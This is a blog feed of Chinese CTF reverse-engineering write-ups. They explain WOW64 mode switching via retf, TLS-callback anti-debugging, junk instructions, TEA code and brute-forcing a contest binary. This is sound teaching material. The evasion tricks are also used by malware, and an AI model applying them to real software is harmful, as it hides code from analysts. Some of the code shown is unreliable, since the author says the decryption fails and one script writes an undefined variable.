<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://gift1a.github.io/atom.xml" rel="self"/>
  
  <link href="https://gift1a.github.io/"/>
  <updated>2022-05-13T11:46:42.089Z</updated>
  <id>https://gift1a.github.io/</id>
  
  <author>
    <name>Gift1a</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF中32位调用64位代码</title>
    <link href="https://gift1a.github.io/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/"/>
    <id>https://gift1a.github.io/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-05-05T11:42:31.000Z</published>
    <updated>2022-05-13T11:46:42.089Z</updated>
    
    <content type="html"><![CDATA[<p>CTF中32位程序调用64位代码</p><span id="more"></span><h1 id="参考文章-v2"><a class="header-anchor" href="#参考文章-v2">¶</a>参考文章</h1><p><a href="https://blog.shi1011.cn/ctf/1750">https://blog.shi1011.cn/ctf/1750</a><br><a href="https://www.anquanke.com/post/id/171111">https://www.anquanke.com/post/id/171111</a></p><p><a href="https://www.psbazx.com/2022/04/06/%E5%85%B3%E4%BA%8E32%E4%BD%8D%E4%B8%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%88%87%E6%8D%A2/">https://www.psbazx.com/2022/04/06/关于32位与64位程序切换/</a></p><p><a href="https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html">https://moliam.github.io/2018/11/17/Wow64-at-the-assemly-level.html</a></p><h1 id="基础知识"><a class="header-anchor" href="#基础知识">¶</a>基础知识</h1><h2 id="CS和IP"><a class="header-anchor" href="#CS和IP">¶</a>CS和IP</h2><p>CS是代码段寄存器，IP是指令指针寄存器</p><blockquote><p>之所以要这样设计是因为8086CPU是16位的，而物理地址是20位的，他内存的寄存器只能表现16位的地址，因此使用ip寄存器来存放偏移地址</p></blockquote><p>我们假设CS的值为M，IP的值为N，那么8086CPU将从内存M*16+N单元开始，读取下一条指令</p><p>工作流程</p><ul><li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲区</li><li>IP=IP+所读取指令的长度，便于读取下一条指令</li><li>执行指令，重复第一步</li></ul><p>如果我们想修改CS:IP的值，可以使用转移指令，例如JMP指令</p><p>以上是基于16位程序中</p><p>但是32位以上段寄存器不再被用来指向段了，在本例子中CS存储的值用于判断是32位或64位工作模式</p><blockquote><p><strong>64位：CS=0x33；32位：CS=0x23</strong></p></blockquote><h2 id="WOW64"><a class="header-anchor" href="#WOW64">¶</a>WOW64</h2><blockquote><p>WOW64 (Windows-on-Windows 64-bit)是一个Windows操作系统的子系统, 它为现有的32位应用程序提供了32位的模拟，可以使大多数32 位应用程序在无需修改的情况下运行在 Windows 64 位版本上。</p></blockquote><p>在x64系统下的进程有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，CS = 0x23；64位模式时，CS = 0x33</p><blockquote><p><strong>这两种工作模式是可以进行转换的，一般通过retf指令，一条retf指令等效于以下两条汇编指令</strong></p></blockquote><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> <span class="built_in">ip</span><span class="comment">//当前读取指令的地址</span></span><br><span class="line"><span class="keyword">pop</span> cs<span class="comment">//cs寄存器</span></span><br></pre></td></tr></tbody></table></figure><p>如果此时栈中有0x33，retf会将0x33弹出到CS寄存器，实现32位程序转换到64位代码的过程。<strong>所以retf是识别32位程序调用64位代码的重要标志</strong></p><p>利用好这一点就可以实现64位代码和32位代码来回切换</p><h1 id="解决"><a class="header-anchor" href="#解决">¶</a>解决</h1><h2 id="dump"><a class="header-anchor" href="#dump">¶</a>dump</h2><p>使用idc将64位的代码段dump下来</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">  fp = fopen(<span class="string">"./final"</span>, <span class="string">"wb"</span>);</span><br><span class="line">  begin = <span class="number">0x4011C0</span>;<span class="comment">//起始地址</span></span><br><span class="line">  end = <span class="number">0x4012A0</span>;<span class="comment">//结束地址</span></span><br><span class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</span><br><span class="line">      fputc(Byte(dexbyte), fp);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>使用ida64打开，选择64-bit mode</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652084552451.png" alt></p><p>如同修改基址为0x4011C0</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652084623510.png" alt></p><p>可以看到已经基本恢复了，剩下只需对比着进行代码分析即可</p><h2 id="修改为64位程序"><a class="header-anchor" href="#修改为64位程序">¶</a>修改为64位程序</h2><p>将这里的0x10B改成0x20B，然后使用ida64打开</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652084704987.png" alt></p><p>基址重新修改为原本程序的基址</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652084801377.png" alt="恢复后"></p><h1 id="例子-v2"><a class="header-anchor" href="#例子-v2">¶</a>例子</h1><h2 id="hgame2022-week4-WOW"><a class="header-anchor" href="#hgame2022-week4-WOW">¶</a>hgame2022-week4-WOW</h2><p>在某些函数中ida无法反编译</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652077738159.png" alt></p><p>查看此函数的汇编，因为在此之后才无法反编译</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652078266535.png" alt></p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652078302028.png" alt="汇编"></p><p>因为retf相当于pop ip;pop cs，而ip是下一条指令的地址</p><p>所以这一段代码意思是先将64位工作模式的标志0x33压入栈中，然后通过call和add esp的值改变retf跳转的地址</p><p>然后通过retf时将0x33pop到cs中，换为64位工作模式，所以ida32无法正确反编译</p><p>再来看第二个函数</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652078950121.png" alt></p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652079092143.png" alt="汇编代码"></p><p>这里是一样的，不过这里使用的是mov指令，将0x23mov到esp+4存储的地址中</p><p>通过这一段代码恢复回32位工作模式</p><h2 id="ISCC-擂台题"><a class="header-anchor" href="#ISCC-擂台题">¶</a>ISCC-擂台题</h2><h2 id="考点-v7"><a class="header-anchor" href="#考点-v7">¶</a>考点</h2><p>创建子进程和子线程、TEA、WOW64</p><h2 id="分析-v7"><a class="header-anchor" href="#分析-v7">¶</a>分析</h2><p>当命令行参数为2时进入第一个函数，否则进入第二个</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652267971329.png" alt></p><h3 id="第二个函数"><a class="header-anchor" href="#第二个函数">¶</a>第二个函数</h3><p>第二个函数传入的参数是命令行参数的第一个，也就是我们的程序绝对路径</p><p>进入第二个函数</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652268136354.png" alt></p><p>这一段就是打开当前程序创建子进程（根据第六个参数判断进程的属性），命令行参数为我们打开程序的路径和" DIO"，然后</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652248950697.png" alt></p><p>然后根据调试事件判断时候break，这里当报告退出进程调试事件才会break</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652249119969.png" alt></p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652268383536.png" alt="创建的新进程"></p><p>这样创建的子进程具有两个命令行参数，所以进入第一个函数</p><h3 id="第一个函数"><a class="header-anchor" href="#第一个函数">¶</a>第一个函数</h3><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652268475082.png" alt="函数列表"></p><h4 id="CreateNewThread函数"><a class="header-anchor" href="#CreateNewThread函数">¶</a>CreateNewThread函数</h4><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652268516934.png" alt></p><p>创建一个子线程，根据第五个参数dwCreationFlags为0可知是线程创建后立即执行，指定函数为StartAddress</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652268675363.png" alt></p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652268738053.png" alt="StartAddress函数"></p><p>就是对flag的格式进行判断，并且对最后的几个字符进行异或</p><p>但是此时我们还未输入，按理说会一直卡在while循环，但是单步步过CreateNewThread时都是正常的</p><h4 id="compare-input函数"><a class="header-anchor" href="#compare-input函数">¶</a>compare_input函数</h4><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652268936181.png" alt></p><p>判断输入前几位是否为ISCC</p><h4 id="encode-and-compare函数"><a class="header-anchor" href="#encode-and-compare函数">¶</a>encode_and_compare函数</h4><p>通过动态调试可以知道前面的while循环是将每八个输入存储为QWORD类型，第二段就是对key，也就是命令行参数的第二个进行加密，然后传入encode()函数</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652269032854.png" alt></p><h5 id="encode-函数"><a class="header-anchor" href="#encode-函数">¶</a>encode()函数</h5><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652269187607.png" alt></p><p>这一段就是开辟空间和初始化直接动调，关键还是对该函数的调用</p><p>注意要先添加命令行参数</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652269289722.png" alt></p><p>开启调试到达该函数，发现了切换为64位工作模式的代码</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652269376040.png" alt></p><p>将这一段dump下来</p><p>这里调用了920000地址处的函数，所以也要一起dump下来</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652269739310.png" alt></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">  fp = fopen(<span class="string">"./final1"</span>, <span class="string">"wb"</span>);</span><br><span class="line">  begin = <span class="number">0x920000</span>;<span class="comment">//起始地址</span></span><br><span class="line">  end = <span class="number">0x93006B</span>;<span class="comment">//结束地址</span></span><br><span class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</span><br><span class="line">      fputc(Byte(dexbyte), fp);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>拖进ida64，可以看出来是tea加密</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652269705752.png" alt></p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652269865596.png" alt="切换回32位"></p><p>经此全部分析就已经结束了，前十六个字符先转long long型，然后进行tea加密，后5个字符进行异或，tea的密钥直接在调用encode函数处提取即可</p><p>加密代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 tmp0;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 tmp1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">32</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[<span class="number">4</span>]={<span class="number">0x11</span>,<span class="number">0x4</span>,<span class="number">0x25</span>,<span class="number">0xf</span>};</span><br><span class="line"><span class="keyword">unsigned</span> __int64 temp[<span class="number">2</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">unsigned</span> __int64 v11[] =</span><br><span class="line">{</span><br><span class="line"><span class="number">0x425B1CD73C3598F1</span>, <span class="number">0x72C63C6A5ACF14BA</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i += <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line">tmp0 = v11[i];</span><br><span class="line">tmp1 = v11[i + <span class="number">1</span>];</span><br><span class="line">__int64 sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j)</span><br><span class="line">{</span><br><span class="line">sum += <span class="number">0x9E3779B9</span>;</span><br><span class="line">tmp0 += (sum + tmp1) ^ (a[<span class="number">0</span>] + <span class="number">16</span> * tmp1) ^ (a[<span class="number">1</span>] + (tmp1 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">tmp1 += (sum + tmp0) ^ (a[<span class="number">2</span>] + <span class="number">16</span> * tmp0) ^ (a[<span class="number">3</span>] + (tmp0 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">}</span><br><span class="line">v11[i] = tmp0;</span><br><span class="line">v11[i + <span class="number">1</span>] = tmp1;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//0x425B1CD73C3598F1, 0x72C63C6A5ACF14BA</span></span><br></pre></td></tr></tbody></table></figure><p>这里我不知道为啥我拿输入去加密得到的结果和程序的一致，但是解不出来😢</p><p>解不出来的解密代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 tmp0;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 tmp1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">32</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[<span class="number">4</span>]={<span class="number">0x11</span>,<span class="number">0x4</span>,<span class="number">0x25</span>,<span class="number">0xf</span>};</span><br><span class="line"><span class="keyword">unsigned</span> __int64 temp[<span class="number">2</span>] = { <span class="number">0</span> };</span><br><span class="line"><span class="keyword">unsigned</span> __int64 v11[] =</span><br><span class="line">{</span><br><span class="line"><span class="number">0x425B1CD73C3598F1</span>, <span class="number">0x72C63C6A5ACF14BA</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">tmp0 = v11[<span class="number">0</span>];</span><br><span class="line">tmp1 = v11[<span class="number">1</span>];</span><br><span class="line">__int64 sum = <span class="number">32</span> * <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j)</span><br><span class="line">{</span><br><span class="line">tmp1 -= (sum + tmp0) ^ (a[<span class="number">2</span>] + <span class="number">16</span> * tmp0) ^ (a[<span class="number">3</span>] + (tmp0 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">tmp0 -= (sum + tmp1) ^ (a[<span class="number">0</span>] + <span class="number">16</span> * tmp1) ^ (a[<span class="number">1</span>] + (tmp1 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">sum -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">}</span><br><span class="line">v11[<span class="number">0</span>]= tmp0;</span><br><span class="line">v11[<span class="number">1</span>]= tmp1;</span><br></pre></td></tr></tbody></table></figure><p>想动态调试这段汇编好像会出问题，只能单步步过</p><p>不过好像使用WINDBG可以调试</p><h2 id="linux"><a class="header-anchor" href="#linux">¶</a>linux</h2><p>代码分析</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652086069132.png" alt></p><p>可以知道这一段代码是在0xDEAD000开辟空间，然后赋值后再SMC解密，然后就出现了无法识别的代码，看汇编动调发现和前面是一样的</p><p><img src="/2022/05/05/CTF%E4%B8%AD32%E4%BD%8D%E8%B0%83%E7%94%A864%E4%BD%8D%E7%A8%8B%E5%BA%8F/1652086040351.png" alt></p><p>使用retf实现jmp far</p><p>解决方法同上</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF中32位程序调用64位代码&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>一些比赛</title>
    <link href="https://gift1a.github.io/2022/05/05/%E4%B8%80%E4%BA%9B%E5%9B%BD%E5%A4%96%E6%AF%94%E8%B5%9B/"/>
    <id>https://gift1a.github.io/2022/05/05/%E4%B8%80%E4%BA%9B%E5%9B%BD%E5%A4%96%E6%AF%94%E8%B5%9B/</id>
    <published>2022-05-05T08:32:02.000Z</published>
    <updated>2022-05-06T06:52:06.654Z</updated>
    
    <content type="html"><![CDATA[<p>比赛</p><span id="more"></span><h1 id="Patriotctf2022-Flowing"><a class="header-anchor" href="#Patriotctf2022-Flowing">¶</a>Patriotctf2022-Flowing</h1><p>主程序就这一段，输入一个十六进制数，然后从文件中读取flag，可以采用爆破，可能是因为linux和windows的不同，我自己模拟出来的数据不一样，所以没爆破出来，最后采用了subprocess爆破</p><p><img src="/2022/05/05/%E4%B8%80%E4%BA%9B%E5%9B%BD%E5%A4%96%E6%AF%94%E8%B5%9B/1651739832426.png" alt></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">real_flag=<span class="string">''</span><span class="comment">#绝对正确的前6个字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffffffff</span>):<span class="comment">#当前爆破的位置上的字符</span></span><br><span class="line">    real_flag_arr_s=<span class="built_in">str</span>(<span class="built_in">hex</span>(i).strip(<span class="string">'0x'</span>))<span class="comment">#输入到程序中的字符串，hex自带0x所以要去除掉0x</span></span><br><span class="line">    <span class="comment">#上面都是一些初始化</span></span><br><span class="line">    p = subprocess.Popen([<span class="string">"./flowing"</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    p.stdin.write(real_flag_arr_s.encode())</span><br><span class="line">    p.stdin.close()<span class="comment">#停止输入</span></span><br><span class="line">    out = p.stdout.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"PCTF"</span> <span class="keyword">in</span> out <span class="keyword">or</span> <span class="string">b"pctf"</span> <span class="keyword">in</span> out:</span><br><span class="line">        <span class="built_in">print</span>(out)</span><br><span class="line">        exit()</span><br></pre></td></tr></tbody></table></figure><h1 id="Patriotctf2022-Fishyfish"><a class="header-anchor" href="#Patriotctf2022-Fishyfish">¶</a>Patriotctf2022-Fishyfish</h1><p>得到.s文件，查阅后得知是gcc编译过程中生成的</p><blockquote><p><strong>生成可执行程序过程为成四个步骤： 1、由.c文件到.i文件，这个过程叫预处理。 2、由.i文件到.s文件，这个过程叫编译。 3、由.s文件到.o文件，这个过程叫汇编。 4、由.o文件到可执行文件，这个过程叫链接。</strong></p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//使用以下指令将.s文件生成.o文件</span><br><span class="line">gcc -c test.s -o test.o</span><br><span class="line">//使用以下指令将.o文件生成可执行文件</span><br><span class="line">gcc test.o -o test</span><br></pre></td></tr></tbody></table></figure><p>将生成的可执行文件拖入ida中</p><p><img src="/2022/05/05/%E4%B8%80%E4%BA%9B%E5%9B%BD%E5%A4%96%E6%AF%94%E8%B5%9B/1651740964609.png" alt></p><p>可以看到这里调用了socket网络通信</p><p><a href="https://zhuanlan.zhihu.com/p/260139078">https://zhuanlan.zhihu.com/p/260139078</a></p><p>先将异或后的数据发送到目标地址中，然后读取数据并写入文件中</p><p>我们可以不使用套接字进行编程，而使用pwntools这个工具，然后模拟socket接收数据</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启远程端口,网址+端口</span></span><br><span class="line">p=remote(<span class="string">"chal1.pctf.competitivecyber.club"</span>,<span class="number">10015</span>)</span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">p.send(<span class="string">b"obese dragonfish"</span>)</span><br><span class="line"><span class="comment">#接收指定长度的数据，直到timeout</span></span><br><span class="line">data=p.readn(<span class="number">0x3888</span>)</span><br><span class="line"><span class="comment">#将数据写入文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"fish.bin"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bin_file)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;比赛&lt;/p&gt;</summary>
    
    
    
    <category term="Competition" scheme="https://gift1a.github.io/categories/Competition/"/>
    
    
    <category term="Competition" scheme="https://gift1a.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>MiniLctf2022</title>
    <link href="https://gift1a.github.io/2022/05/05/MiniLctf2022/"/>
    <id>https://gift1a.github.io/2022/05/05/MiniLctf2022/</id>
    <published>2022-05-05T02:42:32.000Z</published>
    <updated>2022-05-12T08:44:16.552Z</updated>
    
    <content type="html"><![CDATA[<p>题目质量很高，我也是真的菜</p><span id="more"></span><h1 id="Twin"><a class="header-anchor" href="#Twin">¶</a>Twin</h1><h2 id="考点：TLS-CallBack函数、SMC、XXTEA-XXTEA魔改、反调试、花指令"><a class="header-anchor" href="#考点：TLS-CallBack函数、SMC、XXTEA-XXTEA魔改、反调试、花指令">¶</a>考点：TLS_CallBack函数、SMC、XXTEA+XXTEA魔改、反调试、花指令</h2><h2 id="前置知识-v3"><a class="header-anchor" href="#前置知识-v3">¶</a>前置知识</h2><h3 id="TLS-CALLBACK函数"><a class="header-anchor" href="#TLS-CALLBACK函数">¶</a>TLS_CALLBACK函数</h3><blockquote><p><strong>TLS设计的本意，是为了解决多线程程序中变量同步的问题，是Thread Local Storage的缩写，意为线程本地存储。线程本身有独立于其他线程的栈空间，因此线程中的局部变量不用考虑同步问题。多线程同步问题在于对全局变量的访问，TLS在操作系统的支持下，通过把全局变量打包到一个特殊的节，当每次创建线程时把这个节中的数据当做副本，拷贝到进程空闲的地址空间中。以后线程可以像访问局部变量一样访问该异于其他线程的全局变量的副本，而不用加同步控制。</strong></p></blockquote><p>TLS回调函数常用于反调试</p><p>每当创建或终止进程的线程时会自动调用执行的函数。当然，创建进程的主线程的时候也会自动调用回调函数，且其执行先于EP代码。反调试技术就是利用的TLS回调函数的这一特征。它是各线程独立的数据存储空间，可修改进程的全局/静态数据</p><p>而它可以注册多个TLS_CALLBACK函数</p><p><img src="/2022/05/05/MiniLctf2022/1651974115184.png" alt></p><p><img src="/2022/05/05/MiniLctf2022/1651974138087.png" alt></p><h3 id="进程通信-共享内存CreateFileMapping-MapViewOfFile"><a class="header-anchor" href="#进程通信-共享内存CreateFileMapping-MapViewOfFile">¶</a>进程通信-共享内存CreateFileMapping+MapViewOfFile</h3><p><a href="https://www.cnblogs.com/endenvor/p/9753135.html">https://www.cnblogs.com/endenvor/p/9753135.html</a></p><p>把文件映像到内存，首先必须调用CreateFileMapping()函数，然后再调用MapViewOfFile函数，把文件视映像到进程地址空间上。这样多个子进程都可以访问该内存</p><h2 id="分析-v11"><a class="header-anchor" href="#分析-v11">¶</a>分析</h2><p>这道题所有的字符串都进行了异或加密</p><p>在main函数中逆出来得到的是fake_flag，然后去Export发现了TLS函数</p><p><a href="https://blog.csdn.net/CSNN2019/article/details/113094488">https://blog.csdn.net/CSNN2019/article/details/113094488</a></p><p><img src="/2022/05/05/MiniLctf2022/1651758278192.png" alt></p><p>点进去发现里面什么代码都没有，很奇怪，查看汇编</p><p><img src="/2022/05/05/MiniLctf2022/1651758334830.png" alt></p><p>这里加了一处花指令导致ida无法正常分析</p><blockquote><p><strong>这段花指令就是将返回地址（call后压入栈的值）加上插入字符串的长度，以跳过这段无用代码</strong></p></blockquote><p>直接改为jmp到原本指令的地址</p><p><img src="/2022/05/05/MiniLctf2022/1651975334021.png" alt></p><p>然后F5</p><p><img src="/2022/05/05/MiniLctf2022/1651758540000.png" alt></p><p>要注意的是这里面还有一处花指令很坑</p><p><img src="/2022/05/05/MiniLctf2022/1651758596649.png" alt></p><p>去除之后，这里就是将我们的函数注册为TLS_CALLBACK函数</p><p><img src="/2022/05/05/MiniLctf2022/1651758699171.png" alt></p><h3 id="将文件映射到内存中"><a class="header-anchor" href="#将文件映射到内存中">¶</a>将文件映射到内存中</h3><p><img src="/2022/05/05/MiniLctf2022/1651975828550.png" alt></p><p>继续往下，这里的reason是TLS_CALLBACK函数的第二个参数，因为还处于主线程，所以是1，所以不会进入这里的if</p><p><img src="/2022/05/05/MiniLctf2022/1651976154245.png" 